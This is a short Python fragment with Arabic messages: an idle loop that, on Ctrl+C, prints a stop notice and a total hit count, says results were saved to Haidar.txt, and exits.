# انتظار المستخدم للخروج
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print(f"\n{red}[!] تم إيقاف البرنامج بواسطة المستخدم")
    print(f"{green}[+] إجمالي الصيد: {total_hits}")
    print(f"{cyan}[+] تم حفظ النتائج في ملف Haidar.txt")
    sys.exit(0)
